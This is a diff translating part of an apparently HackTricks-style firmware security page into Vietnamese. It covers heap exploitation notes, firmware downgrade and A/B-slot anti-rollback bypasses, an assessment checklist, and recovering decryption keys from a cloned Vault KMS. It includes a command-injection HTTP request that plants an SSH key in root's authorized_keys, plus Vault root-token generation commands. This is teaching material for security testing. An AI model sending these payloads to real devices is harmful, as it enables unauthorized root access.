+Phát triển PoC cho các lỗ hổng đã xác định đòi hỏi hiểu sâu kiến trúc mục tiêu và lập trình bằng ngôn ngữ cấp thấp. Các biện pháp bảo vệ runtime nhị phân hiếm gặp trong hệ thống nhúng, nhưng khi có, có thể cần đến các kỹ thuật như Return Oriented Programming (ROP).
 
-### uClibc fastbin exploitation notes (embedded Linux)
+### Ghi chú khai thác fastbin của uClibc (embedded Linux)
 
-- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").<sup>[[6]](#references)</sup>
-- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
-- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
-- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.
+- **Fastbin + consolidation:** uClibc sử dụng fastbin tương tự glibc. Một lần cấp phát lớn về sau có thể kích hoạt `__malloc_consolidate()`, vì vậy mọi fake chunk phải vượt qua các bước kiểm tra (size hợp lý, `fd = 0` và các chunk xung quanh được xem là “đang sử dụng”).<sup>[[6]](#references)</sup>
+- **Binary non-PIE khi bật ASLR:** nếu ASLR được bật nhưng binary chính là **non-PIE**, địa chỉ `.data/.bss` bên trong binary sẽ ổn định. Có thể nhắm đến một vùng đã có cấu trúc giống header của heap chunk hợp lệ để đưa một lần cấp phát fastbin vào **bảng function pointer**.
+- **NUL làm parser dừng:** khi parse JSON, `\x00` trong payload có thể làm parser dừng lại trong khi vẫn giữ các byte phía sau do attacker kiểm soát để dùng cho stack pivot/ROP chain.
+- **Shellcode qua `/proc/self/mem`:** ROP chain gọi `open("/proc/self/mem")`, `lseek()` và `write()` có thể đặt shellcode có quyền thực thi vào một mapping đã biết rồi nhảy đến đó.
 
-## Prepared Operating Systems for Firmware Analysis
+## Hệ điều hành được chuẩn bị sẵn để phân tích firmware
 
-Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.
+Các hệ điều hành như [AttifyOS](https://github.com/adi0x90/attifyos) và [EmbedOS](https://github.com/scriptingxss/EmbedOS) cung cấp môi trường được cấu hình sẵn để kiểm thử bảo mật firmware, với các công cụ cần thiết.
 
-## Prepared OSs to analyze Firmware
+## Các OS được chuẩn bị sẵn để phân tích firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS là một distro được thiết kế để hỗ trợ đánh giá bảo mật và pentesting thiết bị Internet of Things (IoT). Distro này giúp tiết kiệm nhiều thời gian bằng cách cung cấp môi trường cấu hình sẵn với đầy đủ công cụ cần thiết.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Hệ điều hành kiểm thử bảo mật nhúng dựa trên Ubuntu 18.04, được cài sẵn các công cụ kiểm thử bảo mật firmware.
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Tấn công hạ cấp firmware và cơ chế cập nhật không an toàn
 
-Even when a vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.<sup>[[4]](#references)</sup>
+Ngay cả khi vendor triển khai kiểm tra chữ ký mật mã cho firmware image, **bảo vệ chống rollback phiên bản (downgrade)** thường bị bỏ qua. Khi boot- hoặc recovery-loader chỉ xác minh chữ ký bằng public key được nhúng nhưng không so sánh *version* (hoặc bộ đếm đơn điệu) của image được flash, attacker có thể cài đặt hợp lệ một **firmware cũ hơn, dễ bị tấn công nhưng vẫn có chữ ký hợp lệ**, qua đó đưa các lỗ hổng đã được vá quay trở lại.<sup>[[4]](#references)</sup>
 
-Typical attack workflow:
+Quy trình tấn công điển hình:
 
-1. **Obtain an older signed image**
-   * Grab it from the vendor’s public download portal, CDN or support site.
-   * Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
-   * Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
-2. **Upload or serve the image to the device** via any exposed update channel:
-   * Web UI, mobile-app API, USB, TFTP, MQTT, etc.
-   * Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
-3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
-4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.
+1. **Lấy một image cũ có chữ ký**
+   * Tải từ cổng tải xuống công khai, CDN hoặc trang hỗ trợ của vendor.
+   * Trích xuất từ ứng dụng di động/desktop đi kèm (ví dụ bên trong Android APK tại `assets/firmware/`).
+   * Tìm từ các kho lưu trữ bên thứ ba như VirusTotal, Internet archives, forum, v.v.
+2. **Tải image lên hoặc cung cấp image cho thiết bị** qua bất kỳ kênh cập nhật nào đang mở:
+   * Web UI, API của mobile app, USB, TFTP, MQTT, v.v.
+   * Nhiều thiết bị IoT tiêu dùng có các endpoint HTTP(S) *không cần xác thực*, chấp nhận firmware blob mã hóa Base64, giải mã ở phía server rồi kích hoạt recovery/upgrade.
+3. Sau khi downgrade, khai thác lỗ hổng đã được vá trong bản phát hành mới hơn (ví dụ bộ lọc command-injection được bổ sung sau này).
+4. Tùy chọn flash lại image mới nhất hoặc tắt cập nhật để tránh bị phát hiện sau khi đã có được persistence.
 
-### Example: Command Injection After Downgrade
+### Ví dụ: Command Injection sau khi downgrade
 
 ```http
 POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
@@ -605,11 +603,11 @@ Content-Type: application/octet-stream
 Content-Length: 0
 ```
 
-In the vulnerable (downgraded) firmware, the `md5` parameter is concatenated directly into a shell command without sanitisation, allowing injection of arbitrary commands (here – enabling SSH key-based root access). Later firmware versions introduced a basic character filter, but the absence of downgrade protection renders the fix moot.<sup>[[4]](#references)</sup>
+Trong firmware dễ bị tấn công (đã bị hạ cấp), tham số `md5` được ghép trực tiếp vào lệnh shell mà không được làm sạch, cho phép chèn các lệnh tùy ý (ở đây là bật quyền truy cập root bằng SSH key). Các phiên bản firmware sau này đã bổ sung bộ lọc ký tự cơ bản, nhưng việc thiếu cơ chế chống hạ cấp khiến bản sửa lỗi trở nên vô nghĩa.<sup>[[4]](#references)</sup>
 
-### Extracting Firmware From Mobile Apps
+### Trích xuất firmware từ ứng dụng di động
 
-Many vendors bundle full firmware images inside their companion mobile applications so that the app can update the device over Bluetooth/Wi-Fi. These packages are commonly stored unencrypted in the APK/APEX under paths like `assets/fw/` or `res/raw/`. Tools such as `apktool`, `ghidra`, or even plain `unzip` allow you to pull signed images without touching the physical hardware.<sup>[[4]](#references)</sup>
+Nhiều nhà cung cấp đóng gói toàn bộ ảnh firmware bên trong ứng dụng di động đi kèm để ứng dụng có thể cập nhật thiết bị qua Bluetooth/Wi-Fi. Các gói này thường được lưu trữ không mã hóa trong APK/APEX, tại các đường dẫn như `assets/fw/` hoặc `res/raw/`. Các công cụ như `apktool`, `ghidra`, hoặc thậm chí `unzip` thuần túy cho phép bạn trích xuất các ảnh đã ký mà không cần tiếp xúc với phần cứng thực.<sup>[[4]](#references)</sup>
 
 ```
 $ apktool d vendor-app.apk -o vendor-app
@@ -617,52 +615,52 @@ $ ls vendor-app/assets/firmware
 firmware_v1.3.11.490_signed.bin
 ```
 
-### Updater-only anti-rollback bypass in A/B slot designs
+### Bypass anti-rollback chỉ ở updater trong thiết kế khe A/B
 
-Some vendors do implement an anti-downgrade **ratchet**, but only inside the *updater* logic (for example a UDS routine over CAN, a recovery command, or a userspace OTA agent). If the **bootloader** later checks only the image signature/CRC and trusts the partition table or slot metadata, rollback protection can still be bypassed.<sup>[[7]](#references)</sup>
+Một số nhà cung cấp có triển khai **ratchet** chống hạ cấp, nhưng chỉ bên trong logic *updater* (ví dụ: một routine UDS qua CAN, lệnh recovery hoặc OTA agent ở userspace). Nếu **bootloader** sau đó chỉ kiểm tra chữ ký/CRC của image và tin tưởng bảng phân vùng hoặc metadata của slot, thì vẫn có thể bypass cơ chế bảo vệ rollback.<sup>[[7]](#references)</sup>
 
-Typical weak design:
+Thiết kế yếu thường gặp:
 
-- Firmware metadata contains both a version descriptor and a **security ratchet** / monotonic counter.
-- The updater compares the image ratchet against a value stored in persistent storage and rejects older signed images.
-- The bootloader does **not** parse that ratchet and only verifies header, CRC, and signature before booting the selected slot.
-- Slot activation is stored separately in a partition table or per-slot generation counter and is **not cryptographically bound** to the exact firmware digest that was validated.
+- Metadata firmware chứa cả mô tả phiên bản và **security ratchet** / bộ đếm đơn điệu.
+- Updater so sánh ratchet của image với giá trị lưu trong bộ nhớ bền vững và từ chối các image đã ký có phiên bản cũ hơn.
+- **Bootloader** không phân tích ratchet mà chỉ xác minh header, CRC và chữ ký trước khi boot slot được chọn.
+- Việc kích hoạt slot được lưu riêng trong bảng phân vùng hoặc bộ đếm generation theo từng slot và **không được ràng buộc bằng mật mã** với digest chính xác của firmware đã được xác thực.
 
-This creates a **validate-one-image / boot-another-image** primitive in dual-slot systems. If the attacker can make the updater mark slot B as the next boot target using a current signed image, and can later overwrite slot B before reboot, the bootloader may still boot the downgraded image because it only trusts the already-committed slot metadata.
+Điều này tạo ra primitive **xác thực image này / boot image khác** trong hệ thống dual-slot. Nếu kẻ tấn công có thể khiến updater đánh dấu slot B là mục tiêu boot tiếp theo bằng một image hiện hành đã ký, rồi ghi đè slot B trước khi reboot, bootloader vẫn có thể boot image đã hạ cấp vì nó chỉ tin metadata slot đã được commit.
 
-Common abuse pattern:
+Mẫu lạm dụng phổ biến:
 
-1. Upload a **current signed** firmware into the passive slot and run the normal validation/switch routine so the layout marks that slot as next active.
-2. **Do not reboot yet**. Re-enter the slot-preparation/erase routine in the same session.
-3. Abuse stale boot-state or stale slot-selection logic so the updater erases the **same physical slot** that was just promoted.
-4. Write an **older but still signed** firmware into that slot.
-5. Skip the validation routine that enforces the ratchet and reboot directly.
-6. The bootloader selects the promoted slot, verifies only signature/integrity, and boots the old image.
+1. Tải firmware **hiện hành đã ký** vào slot thụ động và chạy routine xác thực/chuyển đổi thông thường để bố cục đánh dấu slot đó là slot hoạt động tiếp theo.
+2. **Chưa reboot**. Trong cùng session, gọi lại routine chuẩn bị/xóa slot.
+3. Lạm dụng trạng thái boot cũ hoặc logic chọn slot cũ để updater xóa **cùng slot vật lý** vừa được nâng lên.
+4. Ghi firmware **cũ hơn nhưng vẫn được ký** vào slot đó.
+5. Bỏ qua routine xác thực có áp dụng ratchet và reboot trực tiếp.
+6. Bootloader chọn slot đã được nâng lên, chỉ xác minh chữ ký/tính toàn vẹn rồi boot image cũ.
 
-Things to look for when reversing A/B update implementations:
+Những điểm cần tìm khi reverse implementation cập nhật A/B:
 
-- Slot selection derived from **boot-time flags** that are not refreshed after a successful switch.
-- A `prepare_passive_slot()`-style routine that erases a slot based on stale state instead of the **current committed layout**.
-- A `part_write_layout()`-style function that only bumps a **generation counter** / active flag and does not store the validated image hash.
-- Ratchet checks implemented in userspace or updater code, but **not** in ROM / bootloader / secure boot stages.
-- Erase or recovery routines that leave the slot marked as bootable even after its content was removed and rewritten.
+- Việc chọn slot dựa trên **các cờ lúc boot** không được làm mới sau khi chuyển đổi thành công.
+- Routine kiểu `prepare_passive_slot()` xóa slot dựa trên trạng thái cũ thay vì **bố cục hiện được commit**.
+- Hàm kiểu `part_write_layout()` chỉ tăng **generation counter** / cờ hoạt động mà không lưu hash của image đã xác thực.
+- Kiểm tra ratchet được triển khai trong userspace hoặc mã updater nhưng **không có** trong ROM / bootloader / các giai đoạn secure boot.
+- Các routine xóa hoặc recovery vẫn để slot được đánh dấu là có thể boot ngay cả sau khi nội dung của nó bị xóa và ghi lại.
 
-### Checklist for Assessing Update Logic
+### Danh sách kiểm tra logic cập nhật
 
-* Is the transport/authentication of the *update endpoint* adequately protected (TLS + authentication)?
-* Does the device compare **version numbers** or a **monotonic anti-rollback counter** before flashing?
-* Is the image verified inside a secure boot chain (e.g. signatures checked by ROM code)?
-* Does the **bootloader enforce the same ratchet** as the updater, instead of only checking signature/CRC?
-* Is slot activation metadata **bound to the validated firmware digest/version**, or can a slot be modified after promotion?
-* After a slot switch succeeds, is the device forced to reboot or are later update/erase routines still reachable in the same session?
-* Does userland code perform additional sanity checks (e.g. allowed partition map, model number)?
-* Are *partial* or *backup* update flows reusing the same validation logic?
+* Kênh truyền tải/xác thực của *update endpoint* có được bảo vệ đầy đủ (TLS + xác thực) không?
+* Thiết bị có so sánh **số phiên bản** hoặc **bộ đếm anti-rollback đơn điệu** trước khi flash không?
+* Image có được xác minh trong chuỗi secure boot không (ví dụ: chữ ký được kiểm tra bằng mã ROM)?
+* **Bootloader có áp dụng cùng ratchet** như updater không, hay chỉ kiểm tra chữ ký/CRC?
+* Metadata kích hoạt slot có được **ràng buộc với digest/phiên bản firmware đã xác thực** không, hay slot vẫn có thể bị sửa đổi sau khi được nâng lên?
+* Sau khi chuyển đổi slot thành công, thiết bị có buộc phải reboot không, hay các routine cập nhật/xóa khác vẫn có thể được gọi trong cùng session?
+* Mã userland có thực hiện các kiểm tra hợp lệ bổ sung không (ví dụ: sơ đồ phân vùng được phép, số model)?
+* Các luồng cập nhật *một phần* hoặc *sao lưu* có dùng lại cùng logic xác thực không?
 
-> 💡  If any of the above are missing, the platform is probably vulnerable to rollback attacks.
+> 💡  Nếu thiếu bất kỳ mục nào ở trên, nền tảng có thể dễ bị tấn công rollback.
 
-## Vulnerable firmware to practice
+## Firmware dễ bị tấn công để thực hành
 
-To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.
+Để thực hành tìm lỗ hổng trong firmware, hãy bắt đầu với các dự án firmware dễ bị tấn công sau:
 
 - OWASP IoTGoat
   - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -677,22 +675,22 @@ To practice discovering vulnerabilities in firmware, use the following vulnerabl
 - Damn Vulnerable IoT Device (DVID)
   - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
-## Recovering firmware decryption keys from embedded KMS/Vault state
+## Khôi phục khóa giải mã firmware từ trạng thái KMS/Vault nhúng
 
-When an update image mixes small plaintext metadata with a large high-entropy blob, do container triage before brute-forcing anything:<sup>[[1]](#references)</sup>
+Khi image cập nhật kết hợp metadata plaintext nhỏ với một blob entropy cao lớn, hãy phân tích sơ bộ container trước khi thử brute-force bất cứ thứ gì:<sup>[[1]](#references)</sup>
 
-- Dump headers, offsets and line boundaries with `hexdump`, `xxd`, `strings -tx`, `base64 -d`, and `binwalk -E`.
-- `Salted__` usually means OpenSSL `enc` format: the next 8 bytes are the salt and the remaining bytes are ciphertext.
-- A Base64 field that decodes to exactly `256` bytes is a strong hint that you are looking at an RSA-2048 ciphertext wrapping a random firmware password/session key.
-- Detached PGP material in the same file often protects authenticity only; do not assume it is the confidentiality mechanism.
+- Dump header, offset và ranh giới dòng bằng `hexdump`, `xxd`, `strings -tx`, `base64 -d` và `binwalk -E`.
+- `Salted__` thường cho biết định dạng OpenSSL `enc`: 8 byte tiếp theo là salt, các byte còn lại là ciphertext.
+- Một trường Base64 giải mã thành đúng `256` byte là dấu hiệu mạnh cho thấy đây là ciphertext RSA-2048 dùng để bọc mật khẩu firmware/khóa phiên ngẫu nhiên.
+- PGP material tách rời trong cùng file thường chỉ bảo vệ tính xác thực; đừng cho rằng đó là cơ chế bảo mật dữ liệu.
 
-If static key hunting (`grep`, `strings`, PEM/PGP searches) fails, reverse the **operational decrypt path** instead of only searching for private keys:
+Nếu việc tìm khóa tĩnh (`grep`, `strings`, tìm PEM/PGP) không hiệu quả, hãy reverse **luồng giải mã khi vận hành** thay vì chỉ tìm private key:
 
-- Decompile the updater / management binary and trace who reads the encrypted blob, which helper/API unwraps it, and the logical key name it requests.
-- Search the extracted root filesystem for KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) plus unit files and init scripts.
-- Treat plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens, or local KMS auto-unseal scripts as equivalent to private-key material.
+- Decompile updater / binary quản lý và theo dõi thành phần nào đọc blob đã mã hóa, helper/API nào giải bọc nó và tên khóa logic được yêu cầu.
+- Tìm trong root filesystem đã trích xuất các trạng thái KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), cùng các unit file và init script.
+- Xem plaintext `vault operator unseal ...`, recovery key, bootstrap token hoặc script tự động unseal KMS cục bộ như những thứ tương đương private-key material.
 
-If the appliance ships the original Vault binary and storage backend, replaying that environment is usually easier than reimplementing Vault internals:
+Nếu thiết bị có sẵn binary Vault gốc và storage backend, việc dựng lại môi trường đó thường dễ hơn so với triển khai lại các thành phần bên trong Vault:
 
 ```bash
 vault server -config=/tmp/vault.hcl
@@ -709,34 +707,33 @@ FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x
 TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
 ```
 
-With root on the cloned KMS:
+Khi có quyền root trên KMS đã clone:
 
-- Make transit keys exportable only inside the isolated clone: `vault write transit/keys/<name>/config exportable=true`
-- Export the unwrap key: `vault read transit/export/encryption-key/<name>`
-- Try the recovered RSA key with the exact padding/hash pair used by the KMS. A failed PKCS#1 v1.5 decrypt and a failed default OAEP decrypt do **not** prove the key is wrong; many Vault-backed flows use OAEP with SHA-256, while common libraries default to SHA-1.
-- If the payload starts with `Salted__`, reproduce the vendor's OpenSSL KDF exactly (`EVP_BytesToKey`, often MD5 on legacy appliances) before attempting AES-CBC decryption.
+- Chỉ trong bản clone cô lập, đặt các khóa transit thành có thể xuất: `vault write transit/keys/<name>/config exportable=true`
+- Xuất khóa unwrap: `vault read transit/export/encryption-key/<name>`
+- Thử khóa RSA đã khôi phục với đúng cặp padding/hash mà KMS sử dụng. Giải mã thất bại với PKCS#1 v1.5 và giải mã OAEP mặc định thất bại **không** chứng minh khóa sai; nhiều luồng xử lý dùng Vault sử dụng OAEP với SHA-256, trong khi các thư viện phổ biến mặc định dùng SHA-1.
+- Nếu payload bắt đầu bằng `Salted__`, hãy tái tạo chính xác KDF OpenSSL của nhà cung cấp (`EVP_BytesToKey`, thường dùng MD5 trên các thiết bị cũ) trước khi thử giải mã AES-CBC.
 
-This turns "encrypted firmware" into a more general problem: **recover the appliance-side operational keys, then reproduce the exact unwrap + KDF parameters offline**.
+Điều này biến bài toán “firmware đã mã hóa” thành một bài toán tổng quát hơn: **khôi phục các khóa vận hành phía thiết bị, rồi tái tạo chính xác các tham số unwrap + KDF ngoại tuyến**.
 
-## Training and Certifications
+## Đào tạo và Chứng chỉ
 
 - [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
 
 ## References
 
-- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
-- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
-- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
-- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
-- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
-- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
-- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
-- [9] [ROOT Tesla OS on QEMU Part 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
-- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
-- [11] [ROOT Tesla OS on QEMU Part 2: Debugging and Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
-- [12] [Dell BIOS Passwords: Weak XOR Encryption Allows Recovery from SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
-- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
-- [14] [VoidStar Security — Brushing Up on Hardware Hacking Part 2](https://voidstarsec.com/blog/brushing-up-part-2)
-
+- [1] [Cracking Firmware bằng Claude: Kỹ năng cấp cao cấp, quyền tự chủ cấp sơ cấp](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
+- [2] [Phương pháp kiểm thử bảo mật firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
+- [3] [Hack IoT thực tiễn: Hướng dẫn toàn diện về tấn công Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
+- [4] [Khai thác zero-day trên phần cứng bị bỏ hoang – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Một thiết bị thông minh giá 20 đô đã cho tôi quyền truy cập vào nhà bạn như thế nào](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
+- [6] [Giờ bạn đã thấy mi: Giờ bạn bị Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
+- [7] [Synacktiv - Khai thác Tesla Wall Connector qua cổng kết nối sạc - Phần 2: vượt qua cơ chế chống hạ cấp](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
+- [8] [Làm đèn nhấp nháy: Khai thác Philips Hue Bridge qua mạng không dây](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
+- [9] [ROOT Tesla OS trên QEMU Phần 1: Giải nén](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
+- [10] [Tài liệu Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
+- [11] [ROOT Tesla OS trên QEMU Phần 2: Gỡ lỗi và sửa lỗi](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
+- [12] [Mật khẩu BIOS Dell: Mã hóa XOR yếu cho phép khôi phục từ SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
+- [13] [R3n5k1/dellpwn - Công cụ khôi phục mật khẩu BIOS Dell](https://github.com/R3n5k1/dellpwn)
+- [14] [VoidStar Security — Ôn lại kỹ thuật hack phần cứng Phần 2](https://voidstarsec.com/blog/brushing-up-part-2)
 {{#include ../../banners/hacktricks-training.md}}
